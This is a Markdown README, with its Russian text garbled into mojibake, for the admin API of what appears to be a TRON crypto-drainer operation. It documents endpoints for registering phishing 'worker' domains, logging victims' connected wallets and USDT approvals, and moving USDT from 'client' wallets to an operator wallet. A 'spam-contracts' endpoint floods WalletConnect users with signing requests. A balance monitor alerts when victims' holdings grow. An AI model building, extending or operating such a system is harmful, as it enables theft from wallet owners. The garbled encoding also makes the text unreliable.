# Admin API Documentation

## –û–±–∑–æ—Ä
Admin API –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –ø–æ–ª–Ω—ã–π –Ω–∞–±–æ—Ä REST endpoints –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–æ–π TRON –∫–æ—à–µ–ª—å–∫–æ–≤. –í—Å–µ —Ä–æ—É—Ç—ã (–∫—Ä–æ–º–µ `/auth/login`) —Ç—Ä–µ–±—É—é—Ç JWT –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏.

## –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è
–í—Å–µ –∑–∞—â–∏—â–µ–Ω–Ω—ã–µ —Ä–æ—É—Ç—ã —Ç—Ä–µ–±—É—é—Ç JWT —Ç–æ–∫–µ–Ω –≤ –∑–∞–≥–æ–ª–æ–≤–∫–µ:
```
Authorization: Bearer <jwt_token>
```

---

## üîê AUTHENTICATION ROUTES

### POST `/admin/auth/login`
–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –≤ –∞–¥–º–∏–Ω –ø–∞–Ω–µ–ª–∏.

**–î–æ—Å—Ç—É–ø:** –ü—É–±–ª–∏—á–Ω—ã–π  
**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:**
```json
{
  "username": "admin",
  "password": "admin123"
}
```

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "admin": {
      "id": 1,
      "username": "admin",
      "last_login": "2025-07-18T10:30:00.000Z"
    }
  },
  "message": "Login successful"
}
```

### GET `/admin/auth/profile`
–ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Ç–µ–∫—É—â–µ–º –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–µ.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "id": 1,
    "username": "admin"
  }
}
```

### POST `/admin/auth/change-password`
–ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è —Ç–µ–∫—É—â–µ–≥–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:**
```json
{
  "oldPassword": "admin123",
  "newPassword": "newPassword123"
}
```

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "message": "Password changed successfully"
  },
  "message": "Password changed successfully"
}
```

### POST `/admin/auth/create-admin`
–°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:**
```json
{
  "username": "newadmin",
  "password": "password123"
}
```

**–û—Ç–≤–µ—Ç (201):**
```json
{
  "success": true,
  "data": {
    "id": 2,
    "username": "newadmin",
    "created_at": "2025-07-18T10:30:00.000Z"
  },
  "message": "Admin created successfully"
}
```

---

## üåê DOMAIN ROUTES

### GET `/admin/domains`
–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –≤—Å–µ—Ö –¥–æ–º–µ–Ω–æ–≤ —Å –ø–∞–≥–∏–Ω–∞—Ü–∏–µ–π.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**Query –ø–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `page` (number, default: 1) - –ù–æ–º–µ—Ä —Å—Ç—Ä–∞–Ω–∏—Ü—ã
- `limit` (number, default: 10) - –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
- `sortBy` (string, default: 'created_at') - –ü–æ–ª–µ –¥–ª—è —Å–æ—Ä—Ç–∏—Ä–æ–≤–∫–∏
- `sortOrder` ('asc' | 'desc', default: 'desc') - –ü–æ—Ä—è–¥–æ–∫ —Å–æ—Ä—Ç–∏—Ä–æ–≤–∫–∏

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "data": [
      {
        "id": 1,
        "worker_id": "worker123",
        "worker_nickname": "Worker One",
        "domain": "example.com",
        "chats": "[\"chat1\", \"chat2\"]",
        "metadata": "{\"name\": \"Example App\"}",
        "operator_wallet_address": "TRX...",
        "operator_wallet_privateKey": "...",
        "only_contract": true,
        "minimal_asset_amount": 10,
        "created_at": "2025-07-18T10:30:00.000Z",
        "updated_at": "2025-07-18T10:30:00.000Z"
      }
    ],
    "pagination": {
      "page": 1,
      "limit": 10,
      "total": 1,
      "totalPages": 1
    }
  }
}
```

### GET `/admin/domains/:id`
–ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ–º–µ–Ω–∞ –ø–æ ID.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–ü–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `id` (number) - ID –¥–æ–º–µ–Ω–∞

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "id": 1,
    "worker_id": "worker123",
    "worker_nickname": "Worker One",
    "domain": "example.com",
    // ... –æ—Å—Ç–∞–ª—å–Ω—ã–µ –ø–æ–ª—è
  }
}
```

### POST `/admin/domains`
–°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –¥–æ–º–µ–Ω–∞.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:**
```json
{
  "worker_id": "worker123",
  "worker_nickname": "Worker One",
  "domain": "example.com",
  "chats": "[\"chat1\", \"chat2\"]",
  "metadata": "{\"name\": \"Example App\"}",
  "operator_wallet_address": "TRX...",
  "operator_wallet_privateKey": "...",
  "only_contract": true,
  "minimal_asset_amount": 10
}
```

**–û—Ç–≤–µ—Ç (201):**
```json
{
  "success": true,
  "data": {
    "id": 1,
    "worker_id": "worker123",
    // ... –æ—Å—Ç–∞–ª—å–Ω—ã–µ –ø–æ–ª—è
  },
  "message": "Domain created successfully"
}
```

### PUT `/admin/domains/:id`
–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –¥–æ–º–µ–Ω–∞.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–ü–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `id` (number) - ID –¥–æ–º–µ–Ω–∞

**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:** –ê–Ω–∞–ª–æ–≥–∏—á–Ω–æ POST, –Ω–æ –≤—Å–µ –ø–æ–ª—è –æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω—ã

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "id": 1,
    // ... –æ–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –ø–æ–ª—è
  },
  "message": "Domain updated successfully"
}
```

### DELETE `/admin/domains/:id`
–£–¥–∞–ª–µ–Ω–∏–µ –¥–æ–º–µ–Ω–∞.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–ü–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `id` (number) - ID –¥–æ–º–µ–Ω–∞

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "message": "Domain deleted successfully"
}
```

---

## üëõ WALLET ROUTES

### GET `/admin/wallets`
–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –≤—Å–µ—Ö –∫–æ—à–µ–ª—å–∫–æ–≤ —Å –ø–∞–≥–∏–Ω–∞—Ü–∏–µ–π.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**Query –ø–∞—Ä–∞–º–µ—Ç—Ä—ã:** –ê–Ω–∞–ª–æ–≥–∏—á–Ω–æ –¥–æ–º–µ–Ω–∞–º

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "data": [
      {
        "id": 1,
        "address": "TRX1234567890abcdef",
        "walletType": "walletconnect",
        "sessionId": "session123",
        "session": "{...}",
        "userAgent": "Mozilla/5.0...",
        "ipAddress": "192.168.1.1",
        "hostname": "example.com",
        "country": "US",
        "metadata": "{...}",
        "has_usdt_approval": true,
        "usdt_approval_txid": "tx123",
        "usdt_approval_date": "2025-07-18T10:30:00.000Z",
        "trxBalance": 100.5,
        "usdtBalance": 50.25,
        "lastBalanceUpdate": "2025-07-18T10:30:00.000Z",
        "created_at": "2025-07-18T10:30:00.000Z",
        "updated_at": "2025-07-18T10:30:00.000Z"
      }
    ],
    "pagination": {
      "page": 1,
      "limit": 10,
      "total": 1,
      "totalPages": 1
    }
  }
}
```

### GET `/admin/wallets/stats`
–ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ –∫–æ—à–µ–ª—å–∫–æ–≤.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "totalWallets": 150,
    "totalTrxBalance": 5000.75,
    "totalUsdtBalance": 25000.50,
    "walletsWithApproval": 85,
    "uniqueCountries": 25,
    "countries": ["US", "CA", "GB", "DE", ...]
  }
}
```

### GET `/admin/wallets/:id`
–ü–æ–ª—É—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞ –ø–æ ID.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–ü–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `id` (number) - ID –∫–æ—à–µ–ª—å–∫–∞

### GET `/admin/wallets/address/:address`
–ü–æ–ª—É—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞ –ø–æ –∞–¥—Ä–µ—Å—É.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–ü–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `address` (string) - –ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞

### PUT `/admin/wallets/:id`
–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–ü–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `id` (number) - ID –∫–æ—à–µ–ª—å–∫–∞

### DELETE `/admin/wallets/:id`
–£–¥–∞–ª–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–ü–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `id` (number) - ID –∫–æ—à–µ–ª—å–∫–∞

---

## ‚úÖ CHECK ROUTES

### GET `/admin/checks`
–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –≤—Å–µ—Ö —á–µ–∫–æ–≤ —Å –ø–∞–≥–∏–Ω–∞—Ü–∏–µ–π.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**Query –ø–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –ø–∞–≥–∏–Ω–∞—Ü–∏–∏
- `status` (string, optional) - –§–∏–ª—å—Ç—Ä –ø–æ —Å—Ç–∞—Ç—É—Å—É ('active', 'expired')

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "data": [
      {
        "id": 1,
        "wallet_address": "TRX1234567890abcdef",
        "amount": 100.50,
        "check_data": "{...}",
        "raw_check": "base64string...",
        "timer_start": "2025-07-18T10:30:00.000Z",
        "timer_end": "2025-07-20T10:30:00.000Z",
        "status": "active",
        "hostname": "example.com",
        "ip_address": "192.168.1.1",
        "user_agent": "Mozilla/5.0...",
        "created_at": "2025-07-18T10:30:00.000Z",
        "updated_at": "2025-07-18T10:30:00.000Z"
      }
    ],
    "pagination": {
      "page": 1,
      "limit": 10,
      "total": 1,
      "totalPages": 1
    }
  }
}
```

### GET `/admin/checks/stats`
–ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ —á–µ–∫–æ–≤.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "totalChecks": 250,
    "activeChecks": 180,
    "totalAmount": 15000.75,
    "statusBreakdown": {
      "active": 180,
      "expired": 70
    }
  }
}
```

### GET `/admin/checks/:id`
–ü–æ–ª—É—á–µ–Ω–∏–µ —á–µ–∫–∞ –ø–æ ID.

### PUT `/admin/checks/:id`
–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —á–µ–∫–∞.

### DELETE `/admin/checks/:id`
–£–¥–∞–ª–µ–Ω–∏–µ —á–µ–∫–∞.

---

## ‚õìÔ∏è BLOCKCHAIN WALLET MANAGEMENT ROUTES

### POST `/admin/blockchain/transfer-usdt-to-operator`
–ü–µ—Ä–µ–≤–æ–¥ USDT —Å –∫–æ—à–µ–ª—å–∫–∞ –∫–ª–∏–µ–Ω—Ç–∞ –Ω–∞ –∫–æ—à–µ–ª–µ–∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–£—Å–ª–æ–≤–∏—è:** –£ –∫–æ—à–µ–ª—å–∫–∞ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å `has_usdt_approval = true`

**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:**
```json
{
  "walletId": 123,
  "amount": 100.50
}
```

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "success": true,
    "transactionId": "tx123456789",
    "amount": 100.50,
    "fromAddress": "TRX_client_address",
    "toAddress": "TRX_operator_address"
  },
  "message": "USDT transfer completed successfully"
}
```

### POST `/admin/blockchain/transfer-trx-from-operator`
–ü–µ—Ä–µ–≤–æ–¥ TRX —Å –∫–æ—à–µ–ª—å–∫–∞ –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω—ã–π –∫–æ—à–µ–ª–µ–∫.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:**
```json
{
  "toAddress": "TRX_recipient_address",
  "amount": 50.25,
  "hostname": "example.com"
}
```

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "success": true,
    "transactionId": "tx987654321",
    "amount": 50.25,
    "fromAddress": "TRX_operator_address",
    "toAddress": "TRX_recipient_address"
  },
  "message": "TRX transfer completed successfully"
}
```

### POST `/admin/blockchain/spam-contracts`
–°–ø–∞–º –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞–º–∏ –Ω–∞ –ø–æ–¥–ø–∏—Å–∞–Ω–∏–µ –¥–ª—è WalletConnect –∫–æ—à–µ–ª—å–∫–æ–≤.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–£—Å–ª–æ–≤–∏—è:** –ö–æ—à–µ–ª–µ–∫ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Ç–∏–ø–∞ 'walletconnect' —Å –∞–∫—Ç–∏–≤–Ω–æ–π —Å–µ—Å—Å–∏–µ–π

**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:**
```json
{
  "walletId": 123,
  "contractCount": 5,
  "delayBetweenContracts": 2000
}
```

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "success": true,
    "walletAddress": "TRX_wallet_address",
    "totalContracts": 5,
    "successCount": 3,
    "failureCount": 2,
    "results": [
      {
        "contractNumber": 1,
        "success": true,
        "transactionId": "tx111"
      },
      {
        "contractNumber": 2,
        "success": false,
        "error": "User rejected transaction"
      }
      // ...
    ]
  },
  "message": "Contract spam completed"
}
```

### GET `/admin/blockchain/session-activity/:walletId`
–ü—Ä–æ–≤–µ—Ä–∫–∞ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ —Å–µ—Å—Å–∏–∏ WalletConnect –∫–æ—à–µ–ª—å–∫–∞.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–ü–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `walletId` (number) - ID –∫–æ—à–µ–ª—å–∫–∞

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "walletId": 123,
    "isActive": true
  },
  "message": "Session is active"
}
```

### GET `/admin/blockchain/balance/:address`
–ü–æ–ª—É—á–µ–Ω–∏–µ –∞–∫—Ç—É–∞–ª—å–Ω–æ–≥–æ –±–∞–ª–∞–Ω—Å–∞ –∫–æ—à–µ–ª—å–∫–∞ –∏–∑ –±–ª–æ–∫—á–µ–π–Ω–∞.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–ü–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `address` (string) - –ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "address": "TRX_wallet_address",
    "trxBalance": 125.75,
    "usdtBalance": 500.25,
    "lastUpdate": "2025-07-18T10:30:00.000Z"
  },
  "message": "Wallet balance retrieved successfully"
}
```

### PUT `/admin/blockchain/update-balance/:walletId`
–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ –∫–æ—à–µ–ª—å–∫–∞ –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö –∞–∫—Ç—É–∞–ª—å–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏ –∏–∑ –±–ª–æ–∫—á–µ–π–Ω–∞.

**–î–æ—Å—Ç—É–ø:** –¢—Ä–µ–±—É–µ—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é  
**–ü–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `walletId` (number) - ID –∫–æ—à–µ–ª—å–∫–∞

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "data": {
    "address": "TRX_wallet_address",
    "trxBalance": 125.75,
    "usdtBalance": 500.25,
    "lastUpdate": "2025-07-18T10:30:00.000Z"
  },
  "message": "Wallet balance updated successfully"
}
```

---

## üö® ERROR RESPONSES

–í—Å–µ –æ—à–∏–±–∫–∏ –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç—Å—è –≤ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ:

**401 Unauthorized:**
```json
{
  "success": false,
  "error": "Access token required"
}
```

**403 Forbidden:**
```json
{
  "success": false,
  "error": "IP address not allowed"
}
```

**404 Not Found:**
```json
{
  "success": false,
  "error": "Resource not found"
}
```

**400 Bad Request:**
```json
{
  "success": false,
  "error": "Invalid request parameters"
}
```

**500 Internal Server Error:**
```json
{
  "success": false,
  "error": "Internal server error"
}
```

---

## üìù LOGGING

–í—Å–µ –∞–¥–º–∏–Ω—Å–∫–∏–µ –¥–µ–π—Å—Ç–≤–∏—è –ª–æ–≥–∏—Ä—É—é—Ç—Å—è –≤ –∫–æ–Ω—Å–æ–ª—å –≤ —Ñ–æ—Ä–º–∞—Ç–µ:
```
[2025-07-18T10:30:00.000Z] Admin Action: CREATE_DOMAIN | Admin: admin (ID: 1) | IP: 192.168.1.1 | URL: /admin/domains
```

---

## üîí SECURITY NOTES

1. **JWT —Ç–æ–∫–µ–Ω—ã** –∏—Å—Ç–µ–∫–∞—é—Ç —á–µ—Ä–µ–∑ 24 —á–∞—Å–∞ (–Ω–∞—Å—Ç—Ä–∞–∏–≤–∞–µ—Ç—Å—è —á–µ—Ä–µ–∑ `JWT_EXPIRES_IN`)
2. **–°–µ–∫—Ä–µ—Ç–Ω—ã–π –∫–ª—é—á** –¥–ª—è JWT –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤ `JWT_SECRET`
3. **–ü–∞—Ä–æ–ª–∏** –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤ —Ö–µ—à–∏—Ä—É—é—Ç—Å—è —Å –ø–æ–º–æ—â—å—é bcrypt
4. **IP —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è** –¥–æ—Å—Ç—É–ø–Ω–∞ —á–µ—Ä–µ–∑ middleware (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)
5. **–í—Å–µ –¥–µ–π—Å—Ç–≤–∏—è** –ª–æ–≥–∏—Ä—É—é—Ç—Å—è –¥–ª—è –∞—É–¥–∏—Ç–∞

---

## üöÄ QUICK START

1. –°–æ–∑–¥–∞–π—Ç–µ –ø–µ—Ä–≤–æ–≥–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞:
```bash
npm run create-admin
```

2. –ê–≤—Ç–æ—Ä–∏–∑—É–π—Ç–µ—Å—å:
```bash
curl -X POST http://localhost:3000/admin/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
```

3. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø–æ–ª—É—á–µ–Ω–Ω—ã–π —Ç–æ–∫–µ–Ω –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –∑–∞—â–∏—â–µ–Ω–Ω—ã–º —Ä–æ—É—Ç–∞–º:
```bash
curl -X GET http://localhost:3000/admin/wallets \
  -H "Authorization: Bearer YOUR_JWT_TOKEN"
```

# Balance Monitor Service

–°–µ—Ä–≤–∏—Å –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –±–∞–ª–∞–Ω—Å–æ–≤ USDT –∫–æ—à–µ–ª—å–∫–æ–≤ –≤ TRON —Å–µ—Ç–∏.

## –§—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å

- **–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥**: –ü—Ä–æ–≤–µ—Ä—è–µ—Ç –±–∞–ª–∞–Ω—Å—ã –≤—Å–µ—Ö –∫–æ—à–µ–ª—å–∫–æ–≤ –∫–∞–∂–¥—ã–µ 2 –º–∏–Ω—É—Ç—ã
- **–£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è**: –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –ø—Ä–∏ —É–≤–µ–ª–∏—á–µ–Ω–∏–∏ USDT –±–∞–ª–∞–Ω—Å–∞
- **–ü–∞–∫–µ—Ç–Ω–∞—è –æ–±—Ä–∞–±–æ—Ç–∫–∞**: –ü—Ä–æ–≤–µ—Ä—è–µ—Ç –∫–æ—à–µ–ª—å–∫–∏ –≥—Ä—É–ø–ø–∞–º–∏ –ø–æ 10 –¥–ª—è –æ–ø—Ç–∏–º–∏–∑–∞—Ü–∏–∏
- **–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞**: –ü—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –ø–æ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥—É
- **–†—É—á–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞**: –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ã–π –∫–æ—à–µ–ª–µ–∫

## –û—Å–Ω–æ–≤–Ω—ã–µ –º–µ—Ç–æ–¥—ã

### `BalanceMonitorService.start()`
–ó–∞–ø—É—Å–∫–∞–µ—Ç –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –±–∞–ª–∞–Ω—Å–æ–≤ —Å –∏–Ω—Ç–µ—Ä–≤–∞–ª–æ–º 2 –º–∏–Ω—É—Ç—ã.

### `BalanceMonitorService.stop()`
–û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –±–∞–ª–∞–Ω—Å–æ–≤.

### `BalanceMonitorService.getStatus()`
–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å—Ç–∞—Ç—É—Å —Å–µ—Ä–≤–∏—Å–∞ (–∑–∞–ø—É—â–µ–Ω/–æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω).

### `BalanceMonitorService.checkSingleWallet(address)`
–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –±–∞–ª–∞–Ω—Å –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ –∫–æ—à–µ–ª—å–∫–∞ –≤—Ä—É—á–Ω—É—é.

### `BalanceMonitorService.getMonitoringStats()`
–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞.

## –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è

–ü—Ä–∏ —É–≤–µ–ª–∏—á–µ–Ω–∏–∏ USDT –±–∞–ª–∞–Ω—Å–∞ —Å–µ—Ä–≤–∏—Å –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è —á–µ—Ä–µ–∑ `NotificationService` —Å —Ç–∏–ø–æ–º `balance_increase`.

–§–æ—Ä–º–∞—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤–∫–ª—é—á–∞–µ—Ç:
- –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –∫–æ—à–µ–ª—å–∫–µ
- –°—Ç–∞—Ä—ã–π –∏ –Ω–æ–≤—ã–π –±–∞–ª–∞–Ω—Å USDT
- –†–∞–∑–º–µ—Ä —É–≤–µ–ª–∏—á–µ–Ω–∏—è
- –°—Å—ã–ª–∫–∏ –Ω–∞ Tronscan

## –ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏—è

```typescript
import { BalanceMonitorService } from './services/balanceMonitorService';

// –ó–∞–ø—É—Å–∫ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞
await BalanceMonitorService.start();

// –ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
const stats = await BalanceMonitorService.getMonitoringStats();
console.log(stats);
```

## –ó–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏

- Prisma ORM –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å –±–∞–∑–æ–π –¥–∞–Ω–Ω—ã—Ö
- TronWeb –¥–ª—è –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –±–ª–æ–∫—á–µ–π–Ω–æ–º TRON
